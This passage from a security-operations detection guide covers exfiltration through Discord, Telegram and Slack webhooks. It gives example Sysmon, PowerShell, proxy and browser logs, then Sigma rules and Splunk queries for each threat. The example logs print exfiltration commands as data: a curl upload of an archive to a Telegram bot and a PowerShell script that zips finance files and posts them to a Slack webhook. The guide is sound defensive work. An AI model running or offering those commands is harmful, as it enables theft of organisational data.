+        <p><strong>Detection logic:</strong> alert on process creation or proxy requests where the command line or URI path contains <span class="mono">api.telegram.org/bot</span> followed by a token-shaped string. On servers, alert on any egress to <span class="mono">api.telegram.org</span> at all.</p>
+
+        <div class="code-block">
+          <div class="code-head"><span class="code-title">Example · Sysmon Event ID 1 — process create (XML, abbreviated)</span><button class="copy-btn" type="button">Copy</button></div>
+          <pre><code class="language-xml">&lt;Event&gt;
+  &lt;System&gt;
+    &lt;Provider Name="Microsoft-Windows-Sysmon"/&gt;
+    &lt;EventID&gt;1&lt;/EventID&gt;
+    &lt;TimeCreated SystemTime="2025-04-17T09:42:03.551Z"/&gt;
+  &lt;/System&gt;
+  &lt;EventData&gt;
+    &lt;Data Name="Image"&gt;C:\Windows\System32\curl.exe&lt;/Data&gt;
+    &lt;Data Name="CommandLine"&gt;curl -s -X POST "https://api.telegram.org/bot&lt;bot-id&gt;:&lt;bot-token&gt;/sendDocument" -F "chat_id=&lt;chat-id&gt;" -F "document=@C:\Users\jmalone\AppData\Local\Temp\log_FIN-WS-0341.zip"&lt;/Data&gt;
+    &lt;Data Name="ParentImage"&gt;C:\Users\jmalone\AppData\Local\Temp\log_helper.exe&lt;/Data&gt;
+    &lt;Data Name="User"&gt;CORP\jmalone&lt;/Data&gt;
+    &lt;Data Name="Hashes"&gt;SHA256=9F2C1A8D4E7B6035A1C8D2E4F6B8A0C3D5E7F9A1B2C4D6E8F0A2C4D6E8F0B2D4&lt;/Data&gt;
+  &lt;/EventData&gt;
+&lt;/Event&gt;</code></pre>
+        </div>
+        <ul>
+          <li><span class="mono">CommandLine</span> — the full bot path with token and <span class="mono">sendDocument</span>; the bot ID and token here are placeholders, but their shape is what the regex matches.</li>
+          <li><span class="mono">ParentImage</span> — the parent is the %TEMP% stealer from threat 1; the parent-child link joins the two detections.</li>
+          <li><span class="mono">Image</span> — curl.exe is legitimate but unusual as a user-context child of a temp binary.</li>
+          <li><span class="mono">document=@…zip</span> — the archive created moments earlier is now leaving the host.</li>
+        </ul>
+
+        <h4>Threat 3 · Compromised CI runner → attacker webhook</h4>
+        <p><strong>Log sources and key fields:</strong> proxy/SWG logs (<span class="mono">srcIp, urlHost, urlPath, requestMethod, userAgent, bytesOut</span>). Cloud/CI audit logs (<span class="mono">actor, jobName, repository, stepName</span>). DNS logs (<span class="mono">clientIp, query</span>). EDR on runners, where available.</p>
+        <p><strong>Normal behavior:</strong> runners talk to package registries, git remotes, and cloud APIs. <strong>Suspicious behavior:</strong> any runner egress to a chat API or generic receiver, especially mid-job, plus webhook URLs appearing in job logs or dependency scripts.</p>
+        <p><strong>Detection logic:</strong> alert when a build-runner subnet or service identity makes an egress connection to a chat API or paste/webhook receiver domain. Also review CI job logs for webhook URL patterns during dependency resolution steps.</p>
+
+        <div class="code-block">
+          <div class="code-head"><span class="code-title">Example · proxy/SWG log row (JSON)</span><button class="copy-btn" type="button">Copy</button></div>
+          <pre><code class="language-json">{
+  "ts": "2025-04-17T11:03:54Z",
+  "srcIp": "10.44.8.17",
+  "srcZone": "build-runners",
+  "method": "POST",
+  "urlHost": "discord.com",
+  "urlPath": "/api/webhooks/&lt;id&gt;/&lt;token&gt;",
+  "userAgent": "Go-http-client/2.0",
+  "contentType": "multipart/form-data",
+  "bytesOut": 48211,
+  "category": "chat",
+  "action": "blocked_by_policy"
+}</code></pre>
+        </div>
+        <ul>
+          <li><span class="mono">srcZone: build-runners</span> — the source is a CI subnet, not a user workstation; chat egress from it has no business case.</li>
+          <li><span class="mono">urlPath</span> — the webhook path pattern; proxy logs are the only place this path is visible in the clear.</li>
+          <li><span class="mono">userAgent: Go-http-client</span> — a default library user agent, typical of scripted exfil inside a job step.</li>
+          <li><span class="mono">action: blocked_by_policy</span> — the egress allow-list stopped it; the DNS+SNI record alone would still prove intent.</li>
+        </ul>
+
+        <h4>Threat 4 · Insider script → private webhook</h4>
+        <p><strong>Log sources and key fields:</strong> PowerShell operational log Event ID 4104 (<span class="mono">ScriptBlockText, ScriptBlockId, Path, runspace</span>). Bash history and auditd (<span class="mono">comm, exe, cmdline</span>) on Linux. DLP alerts (<span class="mono">rule, user, destination, fileName</span>). EDR process events.</p>
+        <p><strong>Normal behavior:</strong> admins use PowerShell and curl constantly; most script blocks contain no external URLs at all. <strong>Suspicious behavior:</strong> script text containing a webhook URL (Discord, Slack hooks, generic receivers) combined with file-read loops or export commands such as CSV (spreadsheet) exports and <span class="mono">Compress-Archive</span>.</p>
+        <p><strong>Detection logic:</strong> alert on script-block or shell-history content matching chat-webhook URL patterns, prioritized when the same session also reads data exports or creates archives.</p>
+
+        <div class="code-block">
+          <div class="code-head"><span class="code-title">Example · PowerShell Event ID 4104 — script block log (XML, abbreviated)</span><button class="copy-btn" type="button">Copy</button></div>
+          <pre><code class="language-xml">&lt;Event&gt;
+  &lt;System&gt;
+    &lt;Provider Name="Microsoft-Windows-PowerShell"/&gt;
+    &lt;EventID&gt;4104&lt;/EventID&gt;
+    &lt;TimeCreated SystemTime="2025-04-17T16:22:41.004Z"/&gt;
+  &lt;/System&gt;
+  &lt;EventData&gt;
+    &lt;Data Name="ScriptBlockText"&gt;$files = Get-ChildItem '\\fileserver\finance\Q2-forecast*' ; Compress-Archive -Path $files -DestinationPath $env:TEMP\q2.zip -Force ; $form = @{file = Get-Item $env:TEMP\q2.zip} ; Invoke-RestMethod -Method Post -Uri "https://hooks.slack.com/services/&lt;workspace-id&gt;/&lt;channel-id&gt;/&lt;token&gt;" -Form $form&lt;/Data&gt;
+    &lt;Data Name="ScriptBlockId"&gt;7c4f2a10-93bb-4e02-a15c-6d8e0f9a3b21&lt;/Data&gt;
+    &lt;Data Name="Path"&gt;&lt;/Data&gt;
+    &lt;Data Name="User"&gt;CORP\jmalone&lt;/Data&gt;
+  &lt;/EventData&gt;
+&lt;/Event&gt;</code></pre>
+        </div>
+        <ul>
+          <li><span class="mono">ScriptBlockText</span> — the full script survives even if it never touched disk; the Slack hook URL is plainly visible.</li>
+          <li><span class="mono">Get-ChildItem … Compress-Archive</span> — the read-then-archive-then-post chain in one line is the insider signature.</li>
+          <li><span class="mono">Path is empty</span> — meaning the code ran interactively or was pasted, not loaded from a file.</li>
+          <li><span class="mono">User</span> — the identity to interview; combine with DLP file events for the data classification.</li>
+        </ul>
+
+        <h4>Threat 5 · Malicious browser extension → webhook</h4>
+        <p><strong>Log sources and key fields:</strong> browser enterprise logs / extension activity logs (<span class="mono">extensionId, extensionName, tabUrl, requestUrl, method</span>). Proxy logs (<span class="mono">userAgent, urlHost, urlPath</span>). EDR browser-process network events. Extension inventory from device management.</p>
+        <p><strong>Normal behavior:</strong> extensions talk to their own update hosts and service APIs, on modest volumes. <strong>Suspicious behavior:</strong> an extension posting page content or form data to an unrelated chat/receiver domain. Also sudden spikes per extension, or any extension whose permission set (read and change all data on all sites) does not match its function.</p>
+        <p><strong>Detection logic:</strong> alert when an extension's network egress includes a chat-API webhook path, or when per-extension egress volume to non-update domains jumps sharply above its 30-day baseline.</p>
+
+        <div class="code-block">
+          <div class="code-head"><span class="code-title">Example · browser extension network log (JSON, enterprise browser export)</span><button class="copy-btn" type="button">Copy</button></div>
+          <pre><code class="language-json">{
+  "ts": "2025-04-17T10:15:09Z",
+  "user": "jmalone@corp.example",
+  "browser": "chrome/124.0.6367.91",
+  "extensionId": "apghjkldoeifakeexampleid0000000000",
+  "extensionName": "Quick Coupon Finder",
+  "triggerTab": "https://intranet.corp.example/finance/forecast",
+  "request": {
+    "method": "POST",
+    "url": "https://discord.com/api/webhooks/&lt;id&gt;/&lt;token&gt;",
+    "contentType": "application/json",
+    "bodyPreview": "{\"content\":\"page: forecast | user: jmalone | tables: 4\"}"
+  }
+}</code></pre>
+        </div>
+        <ul>
+          <li><span class="mono">extensionId</span> — the stable ID to block via browser policy; the name "Quick Coupon Finder" explains nothing about needing intranet access.</li>
+          <li><span class="mono">triggerTab</span> — the page the extension read; here it is an internal finance page, proving content theft.</li>
+          <li><span class="mono">bodyPreview</span> — page text packaged as a chat message; generic "coupon" extensions never post JSON bodies like this.</li>
+          <li><span class="mono">url</span> — again the webhook path pattern; the same regex family as threats 1 and 3 applies.</li>
+        </ul>
+
+        <h4>Threat 6 · Ransomware pre-encryption sample → webhook API</h4>
+        <p><strong>Log sources and key fields:</strong> Sysmon Event ID 11 (<span class="mono">TargetFilename, Image, CreationUtcTime</span>). Sysmon Event ID 3 and firewall logs (<span class="mono">DestinationHostname, DestinationPort, bytesOut</span>). Proxy logs (<span class="mono">bytesOut, method, urlHost</span>). EDR archive/behavior telemetry.</p>
+        <p><strong>Normal behavior:</strong> servers rarely create ZIPs in bulk or speak to chat APIs at all. <strong>Suspicious behavior:</strong> small archive creations by server processes (or archive tools spawned by admin services), followed by modest POSTs to chat or receiver domains. This is the "proof sample" pattern before large-scale encryption.</p>
+        <p><strong>Detection logic:</strong> alert when a server host creates one or more small archives (<span class="mono">.zip</span>, <span class="mono">.7z</span>). The archive must fall within 15 minutes of any egress connection to a chat API or generic receiver domain. Judge the match regardless of bytes transferred.</p>
+
+        <div class="code-block">
+          <div class="code-head"><span class="code-title">Example · Sysmon Event ID 11 — file create (XML, abbreviated)</span><button class="copy-btn" type="button">Copy</button></div>
+          <pre><code class="language-xml">&lt;Event&gt;
+  &lt;System&gt;
+    &lt;Provider Name="Microsoft-Windows-Sysmon"/&gt;
+    &lt;EventID&gt;11&lt;/EventID&gt;
+    &lt;TimeCreated SystemTime="2025-04-17T02:31:12.870Z"/&gt;
+  &lt;/System&gt;
+  &lt;EventData&gt;
+    &lt;Data Name="Image"&gt;C:\Windows\Temp\wuaupd.exe&lt;/Data&gt;
+    &lt;Data Name="TargetFilename"&gt;C:\Windows\Temp\db_sample_FINDB01.7z&lt;/Data&gt;
+    &lt;Data Name="CreationUtcTime"&gt;2025-04-17 02:31:12.801&lt;/Data&gt;
+  &lt;/EventData&gt;
+&lt;/Event&gt;</code></pre>
+        </div>
+        <ul>
+          <li><span class="mono">Image</span> — a fake "Windows update"-named binary running from Temp on a database server: classic intruder tooling.</li>
+          <li><span class="mono">TargetFilename</span> — a small, named sample of the finance database; the <span class="mono">_sample_</span> naming echoes the proof-of-data pattern.</li>
+          <li><span class="mono">.7z</span> — archives on servers are rare; pair this event with the network event that follows it.</li>
+          <li><span class="mono">02:31 UTC</span> — 2 a.m. local time in universal coordinated time (UTC); the hour alone justifies a look at the host's full 24-hour timeline.</li>
+        </ul>
+        <h3 id="sec-5-5-rules">5.5 Sigma rules and Splunk SPL</h3>
+        <p>One Sigma rule and one Splunk query per threat from 5.3. Two additions follow: a DNS first-seen companion rule for Threat 1 (Rule 7), and a companion join query for Rule 6. The Sigma rules use the standard process/network/file/script data models, so they port to Elastic, Sentinel, or Splunk converters with minimal edits. The SPL examples assume these indexes: <span class="mono">index=sysmon</span> with <span class="mono">sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational</span>, <span class="mono">index=wineventlog</span>, <span class="mono">index=proxy</span>, <span class="mono">index=dns</span>, <span class="mono">index=edr</span>, and <span class="mono">index=cloud</span> — adapt index and sourcetype names to your environment before running anything. All webhook IDs and tokens in this section are fake examples.</p>
+
+        <h4>Rule 1 · Discord webhook URL in a process command line (Threat 1)</h4>
+        <p><strong>Severity: high.</strong> This is the core stealer detection. It matches the exact URL shape attackers embed in binaries and scripts; browsers are filtered out to keep the alert clean.</p>
+        <div class="code-block">
+          <div class="code-head"><span class="code-title">Sigma · discord_webhook_in_cmdline.yml</span><button class="copy-btn" type="button">Copy</button></div>
+          <pre><code class="language-yaml">title: Suspicious Discord Webhook URL in Process Command Line
+id: 7c1e4a2f-9b3d-4e86-a51c-0d2f6b8e4a17
+status: experimental
+description: Detects process creations whose command line references a Discord
+  webhook URL, a common exfiltration channel for info stealers and loaders.
+references:
+  - https://attack.mitre.org/techniques/T1567/004/
+  - https://discord.com/developers/docs/resources/webhook
+author: SOC Guide Builders
+date: 2025-02-11
+logsource:
+  category: process_creation
+  product: windows
+  service: sysmon
+detection:
+  selection:
+    CommandLine|contains|all:
+      - 'discord.com'
+      - '/api/webhooks/'
+  filter_browsers:
+    Image|endswith:
+      - '\chrome.exe'
+      - '\msedge.exe'
+      - '\firefox.exe'
+  condition: selection and not filter_browsers
+fields:
+  - Image
+  - CommandLine
+  - ParentImage
+  - User
+  - Hashes
+falsepositives:
+  - Approved internal automation that posts build or monitor notices to a company
+    Discord channel via a documented webhook.
+  - Security tooling that quarantines or analyzes malicious URLs in a command line.
+level: high
+tags:
+  - attack.exfiltration
+  - attack.t1567.004
+  - attack.execution
+</code></pre>
+        </div>
+        <p><strong>Mapping:</strong> <span class="mono">process_creation</span> maps to Sysmon Event ID 1; on Splunk the fields arrive as <span class="mono">CommandLine</span>, <span class="mono">Image</span>, <span class="mono">ParentImage</span> from the <span class="mono">XmlWinEventLog</span> sourcetype. <strong>False positives:</strong> documented DevOps or monitoring webhooks; add them to an allow-list keyed on the exact channel ID. <strong>Tuning:</strong> pin the regex to a channel ID you know is attacker-owned when hunting a specific campaign. Add a ParentImage filter for your approved automation hosts. Raise the severity to critical if the parent process is unsigned and in a user-writable path.</p>
+        <div class="code-block">
+          <div class="code-head"><span class="code-title">Splunk SPL · Discord webhook in command lines</span><button class="copy-btn" type="button">Copy</button></div>
+          <pre><code class="language-spl">index=sysmon sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=1
+    CommandLine="*discord.com*" CommandLine="*/api/webhooks/*"
+| search NOT Image IN ("*\\chrome.exe","*\\msedge.exe","*\\firefox.exe")
+| stats min(_time) as first_seen max(_time) as last_seen count as events
+        values(Image) as images values(ParentImage) as parents values(User) as users
+        by Computer
+| eval first_seen=strftime(first_seen,"%Y-%m-%d %H:%M:%S")
+| sort - events</code></pre>
+        </div>
+        <p class="mini-note">The two wildcard filters mirror the Sigma <span class="mono">contains|all</span> pair exactly, and the <span class="mono">NOT</span> filter mirrors <span class="mono">filter_browsers</span>. Rolling up by Computer is presentation only — the Sigma fires per event, and so does the alert condition here. Replace <span class="mono">index=sysmon</span> and the sourcetype with your names.</p>
+
+        <h4>Rule 2 · Telegram bot API token in command line or proxy path (Threat 2)</h4>
+        <p><strong>Severity: high.</strong> Bot tokens in URLs are both the detection and the incident response target: report the token to Telegram to kill the channel. The regex matches the token shape, not one specific token.</p>
+        <div class="code-block">
+          <div class="code-head"><span class="code-title">Sigma · telegram_bot_api_exfil.yml</span><button class="copy-btn" type="button">Copy</button></div>
+          <pre><code class="language-yaml">title: Telegram Bot API Endpoint with Token-Shaped String
+id: 2f8d6b31-4c57-4a29-9e1a-83f0c7d5b6e2
+status: experimental
+description: Detects command lines or proxy activity referencing the Telegram bot
+  API with a token-shaped string, used by loaders and stealers to report and exfiltrate.
+references:
+  - https://attack.mitre.org/techniques/T1567/004/
+  - https://core.telegram.org/bots/api
+author: SOC Guide Builders
+date: 2025-02-11
+logsource:
+  category: process_creation
+  product: windows
+  service: sysmon
+detection:
+  selection_token:
+    CommandLine|re: 'api\.telegram\.org/bot[0-9]{8,10}:[A-Za-z0-9_-]{30,}'
+  selection_plain:
+    CommandLine|contains: 'api.telegram.org/bot'
+  condition: 1 of selection_*
+fields:
+  - Image
+  - CommandLine
+  - ParentImage
+  - User
+falsepositives:
+  - Approved alerting scripts that post to a corporate Telegram bot; document the
+    token prefix and allow-list it.
+level: high
+tags:
+  - attack.exfiltration
+  - attack.t1567.004
+  - attack.command_and_control
+  - attack.t1105
+</code></pre>
+        </div>
+        <p><strong>Mapping:</strong> same process-creation model as Rule 1. A proxy-side companion swaps the logsource for <span class="mono">category: proxy</span> and matches the URI path instead of the command line. Add it as a second query if you want network-side coverage. <strong>False positives:</strong> approved bots used by monitoring or on-call tooling. <strong>Tuning:</strong> allow-list your corporate bot token prefix (<span class="mono">bot&lt;your-bot-id&gt;:</span> without the secret part). On servers, alert on any <span class="mono">api.telegram.org</span> contact regardless of shape. Treat any captured token as a secret and report it to the provider.</p>
+        <div class="code-block">
+          <div class="code-head"><span class="code-title">Splunk SPL · Telegram bot token pattern (process + proxy)</span><button class="copy-btn" type="button">Copy</button></div>
+          <pre><code class="language-spl">index=sysmon sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=1
+    CommandLine="*api.telegram.org/bot*"
+| eval token_shaped=if(match(CommandLine,"api\\.telegram\\.org/bot[0-9]{8,10}:[A-Za-z0-9_-]{30,}"),"yes","no")
+| stats count as events min(_time) as first_seen max(_time) as last_seen
+        values(Image) as images values(ParentImage) as parents values(User) as users
+        values(token_shaped) as token_shape by Computer
+| sort - events</code></pre>
+        </div>
+        <p class="mini-note">The base filter mirrors the Sigma condition (<span class="mono">1 of selection_*</span>) exactly. Any command line containing <span class="mono">api.telegram.org/bot</span> fires, token-shaped or not, because the token regex is a subset of the plain match. The <span class="mono">token_shaped</span> column flags which hits match the full token shape. For the proxy branch, run the same pattern against <span class="mono">index=proxy</span> with <span class="mono">match(urlPath,...)</span>; adjust <span class="mono">sourcetype=bluecoat:proxysg:access:http</span> to your proxy sourcetype.</p>
+        <h4>Rule 3 · Build-runner egress to chat APIs and webhook receivers (Threat 3)</h4>
+        <p><strong>Severity: high.</strong> The CI variant is caught best at the network layer, because runners should have a short, explicit egress allow-list. Any chat API or generic receiver from a runner subnet is a finding by policy, not just by pattern.</p>
+        <div class="code-block">
+          <div class="code-head"><span class="code-title">Sigma · ci_runner_chat_egress.yml</span><button class="copy-btn" type="button">Copy</button></div>
+          <pre><code class="language-yaml">title: Build Runner Egress to Chat API or Webhook Receiver
+id: 5a9c0d84-1e3f-4b76-b28d-6c4e9f1a3b05
+status: experimental
+description: Detects proxy traffic from build or CI infrastructure to chat APIs and
+  generic webhook receivers, a pattern seen in supply-chain exfiltration such as the
+  Shai-Hulud npm worm.
+references:
+  - https://attack.mitre.org/techniques/T1567/004/
+author: SOC Guide Builders
+date: 2025-02-12
+logsource:
+  category: proxy
+  product: any
+  service: proxy
+detection:
+  selection_webhook_path:
+    c-uri|contains: '/api/webhooks/'
+  selection_chat_hosts:
+    r-dns|endswith:
+      - 'discord.com'
+      - 'api.telegram.org'
+      - 'hooks.slack.com'
+      - 'webhook.site'
+      - 'pipedream.net'
+  condition: selection_webhook_path or selection_chat_hosts
+fields:
+  - srcIp
+  - c-uri
+  - r-dns
+  - useragent
+  - bytes
+falsepositives:
+  - An approved CI job that posts deployment notices to a team chat channel; allow-list
+    the exact destination path and job identity.
+level: high
+tags:
+  - attack.exfiltration
+  - attack.t1567.004
+</code></pre>
+        </div>
+        <p><strong>Mapping:</strong> <span class="mono">category: proxy</span> maps to any SWG or forward-proxy log; the field names (<span class="mono">c-uri</span>, <span class="mono">r-dns</span>) follow the common Sigma proxy conventions and translate directly in the SPL example. <strong>False positives:</strong> legitimate deploy bots and status postings. <strong>Tuning:</strong> restrict the rule to your runner CIDR (IP-range) values or service identities in the SIEM layer — see the note under the query. Prefer matching the path over the domain alone. Treat any hit from a server subnet as policy-review-worthy even when a bot owns it.</p>
+        <div class="code-block">
+          <div class="code-head"><span class="code-title">Splunk SPL · chat API or webhook receiver from any source</span><button class="copy-btn" type="button">Copy</button></div>
+          <pre><code class="language-spl">index=proxy sourcetype=bluecoat:proxysg:access:http
+    (urlHost IN ("discord.com","api.telegram.org","hooks.slack.com","webhook.site","pipedream.net")
+     OR urlPath="*api/webhooks*")
+| stats count as events sum(bytes_out) as bytes_out max(_time) as last_seen
+        values(urlPath) as paths values(useragent) as agents by srcIp, urlHost
+| sort - bytes_out</code></pre>
+        </div>
+        <p class="mini-note">The base query mirrors the Sigma exactly: chat hosts (Sigma's <span class="mono">r-dns</span> is <span class="mono">urlHost</span> here) or any <span class="mono">/api/webhooks/</span> path, with no source filter. Add the production filter from the tuning note on top when you run it: <span class="mono">| where cidrmatch("10.44.8.0/24",srcIp) OR cidrmatch("10.44.9.0/24",srcIp)</span>. Replace the ranges with your real runner subnets, and the sourcetype with your proxy's. Field names assume a CIM (Splunk's Common Information Model) style proxy extraction.</p>
+
+        <h4>Rule 4 · Webhook URL in a PowerShell script block (Threat 4)</h4>
+        <p><strong>Severity: high.</strong> Script-block logging (Event ID 4104) catches exfiltration code that never touches disk. This is the core insider-and-script detection and pairs naturally with DLP alerts on the same user.</p>
+        <div class="code-block">
+          <div class="code-head"><span class="code-title">Sigma · webhook_url_in_scriptblock.yml</span><button class="copy-btn" type="button">Copy</button></div>
+          <pre><code class="language-yaml">title: Webhook URL Pattern in PowerShell Script Block Text
+id: 9d3f7b52-6a18-4c04-8e7b-2f5d0a9c1e46
+status: experimental
+description: Detects PowerShell script blocks referencing chat webhook endpoints
+  (Discord, Slack, Telegram), which indicates script-based data exfiltration attempts.
+references:
+  - https://attack.mitre.org/techniques/T1567/004/
+  - https://learn.microsoft.com/en-us/powershell/scripting/windows-powershell/wmf/whats-new/script-logging
+author: SOC Guide Builders
+date: 2025-02-12
+logsource:
+  product: windows
+  service: powershell
+detection:
+  selection:
+    ScriptBlockText|re: '(discord\.com/api/webhooks/[0-9]+/[\w-]+|hooks\.slack\.com/services/[\w/]+|api\.telegram\.org/bot[0-9]{8,10}:)'
+  condition: selection
+fields:
+  - ScriptBlockText
+  - ScriptBlockId
+  - Path
+  - User
+falsepositives:
+  - Approved automation scripts that post to a documented corporate webhook; allow-list
+    the script path and destination channel ID.
+level: high
+tags:
+  - attack.exfiltration
+  - attack.t1567.004
+  - attack.execution
+  - attack.t1059.001
+</code></pre>
+        </div>
+        <p><strong>Mapping:</strong> <span class="mono">service: powershell</span> is the Windows PowerShell operational log; Event ID 4104 provides <span class="mono">ScriptBlockText</span>. In Splunk it arrives under <span class="mono">index=wineventlog</span> with the PowerShell XML sourcetype. <strong>False positives:</strong> documented automation, chat-bot maintenance scripts. <strong>Tuning:</strong> require script-logging to be enabled at full coverage (start-transcript is not enough). Join with process events so pasted code from a legit admin is ranked lower than code spawned by an office document. Add export keywords (<span class="mono">Compress-Archive</span>, <span class="mono">Get-ChildItem</span>, <span class="mono">Invoke-RestMethod -Method Post</span>) as a boosting pattern rather than a hard requirement.</p>
+        <div class="code-block">
+          <div class="code-head"><span class="code-title">Splunk SPL · webhook patterns in 4104 script blocks</span><button class="copy-btn" type="button">Copy</button></div>
+          <pre><code class="language-spl">index=wineventlog sourcetype=XmlWinEventLog:Microsoft-Windows-PowerShell/Operational EventCode=4104
+    ScriptBlockText="*discord.com/api/webhooks/*" OR ScriptBlockText="*hooks.slack.com/services/*" OR ScriptBlockText="*api.telegram.org/bot*"
+| regex ScriptBlockText="(discord\\.com/api/webhooks/[0-9]+/[\\w-]+|hooks\\.slack\\.com/services/[\\w/]+|api\\.telegram\\.org/bot[0-9]{8,10}:)"
+| stats count max(_time) as last_seen values(ScriptBlockId) as script_ids values(Path) as paths
+        values(User) as users by host
+| sort - count</code></pre>
+        </div>
+        <p class="mini-note">Requires PowerShell script-block logging (module logging) via Group Policy; without it this source is empty. The <span class="mono">regex</span> command tightens the broad text matches to the exact URL shapes.</p>
+        <h4>Rule 5 · Browser process egress to chat APIs, correlated with extensions (Threat 5)</h4>
+        <p><strong>Severity: medium.</strong> On its own this rule is noisy — people legitimately use Discord and Slack in browsers. Its value comes from joining it with extension telemetry (which extension spoke) and volume baselines (which extension suddenly spoke a lot).</p>
+        <div class="code-block">
+          <div class="code-head"><span class="code-title">Sigma · browser_process_chat_egress.yml</span><button class="copy-btn" type="button">Copy</button></div>
+          <pre><code class="language-yaml">title: Browser Process Connection to Chat API Domain
+id: 4b6e2c19-8d05-4f3a-b97e-1a0c5d8f3b72
+status: experimental
+description: Detects browser processes opening network connections to chat API
+  hosts, used with extension telemetry and baselines to find malicious extensions
+  posting page content to webhooks.
+references:
+  - https://attack.mitre.org/techniques/T1567/004/
+author: SOC Guide Builders
+date: 2025-02-13
+logsource:
+  category: network_connection
+  product: windows
+  service: sysmon
+detection:
+  selection_browsers:
+    Image|endswith:
+      - '\chrome.exe'
+      - '\msedge.exe'
+      - '\firefox.exe'
+  selection_chat_hosts:
+    DestinationHostname|endswith:
+      - 'discord.com'
+      - 'api.telegram.org'
+      - 'hooks.slack.com'
+  filter_update_hosts:
+    DestinationHostname|endswith:
+      - 'clients2.google.com'
+      - 'edge.microsoft.com'
+  condition: selection_browsers and selection_chat_hosts and not filter_update_hosts
+fields:
+  - Image
+  - DestinationHostname
+  - DestinationIp
+  - DestinationPort
+  - User
+falsepositives:
+  - Users browsing the Discord or Slack web apps normally; a browsing session produces
+    many connections to the same hosts.
+level: medium
+tags:
+  - attack.exfiltration
+  - attack.t1567.004
+</code></pre>
+        </div>
+        <p><strong>Mapping:</strong> <span class="mono">network_connection</span> maps to Sysmon Event ID 3. <strong>False positives:</strong> ordinary web-app usage; the endpoint cannot see the URL path, so POSTs to <span class="mono">/api/webhooks/</span> look identical to page loads. <strong>Tuning:</strong> at volume, keep this as a hunting query and move the alerting to the proxy layer where the path is visible. Per-extension joins in browser logs (extension ID plus request URL) are the true extension signal. Suppress per-user allow-lists for chat power users.</p>
+        <div class="code-block">
+          <div class="code-head"><span class="code-title">Splunk SPL · browser chat egress, per event</span><button class="copy-btn" type="button">Copy</button></div>
+          <pre><code class="language-spl">index=sysmon sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=3
+    (Image="*\\chrome.exe" OR Image="*\\msedge.exe" OR Image="*\\firefox.exe")
+    (DestinationHostname="*discord.com" OR DestinationHostname="*api.telegram.org" OR DestinationHostname="*hooks.slack.com")
+    NOT (DestinationHostname="*clients2.google.com" OR DestinationHostname="*edge.microsoft.com")
+| stats count as events min(_time) as first_seen max(_time) as last_seen
+        values(DestinationHostname) as destinations values(DestinationIp) as dest_ips
+        by host, User
+| sort - events</code></pre>
+        </div>
+        <p class="mini-note">The three filter groups mirror the Sigma exactly: browser image, chat-API destination (the wildcards reproduce <span class="mono">endswith</span>), and the update-host exclusion. A per-user volume baseline is a documented hunting add-on; it flags users whose browser-to-chat count sits more than 3 standard deviations above the 30-day fleet average. Run it as a separate scheduled search instead of hiding it in the alert path, so this query stays logically equivalent to the Sigma.</p>
+
+        <h4>Rule 6 · Small archive on a server followed by chat-API egress (Threat 6)</h4>
+        <p><strong>Severity: high.</strong> The pre-encryption sample is a two-step story: an archive appears where archives never appear, then a small POST leaves. Sigma expresses the first step cleanly. The first SPL query below mirrors it one-to-one; the second joins both steps in one 15-minute window per host.</p>
+        <div class="code-block">
+          <div class="code-head"><span class="code-title">Sigma · server_archive_outside_userprofiles.yml</span><button class="copy-btn" type="button">Copy</button></div>
+          <pre><code class="language-yaml">title: Archive Created Outside User Profiles on Windows Server
+id: 6e0a5d83-2b47-49c1-a3f6-8c9d1e5b0f24
+status: experimental
+description: Detects ZIP or 7z archives created outside user profiles on Windows
+  hosts, which on servers often marks staging for ransomware proof-of-data uploads
+  or quiet insider copies.
+references:
+  - https://attack.mitre.org/techniques/T1567/004/
+  - https://attack.mitre.org/techniques/T1560/001/
+author: SOC Guide Builders
+date: 2025-02-13
+logsource:
+  category: file_event
+  product: windows
+  service: sysmon
+detection:
+  selection_archives:
+    TargetFilename|endswith:
+      - '.zip'
+      - '.7z'
+  filter_user_profiles:
+    TargetFilename|startswith:
+      - 'C:\Users\'
+  condition: selection_archives and not filter_user_profiles
+fields:
+  - Image
+  - TargetFilename
+  - CreationUtcTime
+falsepositives:
+  - Backup, export, and patching jobs that legitimately write archives on servers;
+    maintain a server-role aware allow-list.
+level: high
+tags:
+  - attack.exfiltration
+  - attack.t1567.004
+  - attack.collection
+  - attack.t1560.001
+</code></pre>
+        </div>
+        <p><strong>Mapping:</strong> <span class="mono">file_event</span> maps to Sysmon Event ID 11. <strong>False positives:</strong> planned export and backup jobs — allow-list them by process image and directory, not by disabling the rule. <strong>Tuning:</strong> scope the rule to server asset tags if workstations are too noisy. The second SPL query below is the full two-step detection; this rule alone is the collection-side anchor. Add <span class="mono">Image</span> checks so archives written by web-server processes rank above maintenance scripts.</p>
+        <div class="code-block">
+          <div class="code-head"><span class="code-title">Splunk SPL · archive created outside user profiles (Sigma equivalent)</span><button class="copy-btn" type="button">Copy</button></div>
+          <pre><code class="language-spl">index=sysmon sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=11
+    (TargetFilename="*.zip" OR TargetFilename="*.7z") NOT TargetFilename="C:\\Users\\*"
+| stats count as events min(_time) as first_seen max(_time) as last_seen
+        values(Image) as images values(TargetFilename) as archives by host
+| sort - events</code></pre>
+        </div>
+        <p class="mini-note">This query mirrors the Sigma one-to-one: archive extension, user-profile exclusion, per-host roll-up. It fires per event like the Sigma does.</p>
+        <div class="code-block">
+          <div class="code-head"><span class="code-title">Splunk SPL · companion join — archive-create then chat-API POST within 15 minutes</span><button class="copy-btn" type="button">Copy</button></div>
+          <pre><code class="language-spl">(index=sysmon sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=11
+    (TargetFilename="*.zip" OR TargetFilename="*.7z") NOT TargetFilename="C:\\Users\\*")
+OR (index=proxy sourcetype=bluecoat:proxysg:access:http
+    urlHost IN ("discord.com","api.telegram.org","hooks.slack.com","webhook.site"))
+| eval artifact=coalesce(host, srcIp)
+| eval archive_ev=if(EventCode=11 AND (like(TargetFilename,"%.zip") OR like(TargetFilename,"%.7z")),1,0)
+| eval chat_ev=if(isnotnull(urlHost),1,0)
+| bin _time span=15m
+| stats max(archive_ev) as had_archive max(chat_ev) as had_chat
+        values(TargetFilename) as archives values(urlHost) as chat_hosts
+        sum(eval(coalesce(bytes_out,0))) as bytes_out
+        by artifact, _time
+| where had_archive=1 AND had_chat=1
+| sort - _time</code></pre>
+        </div>
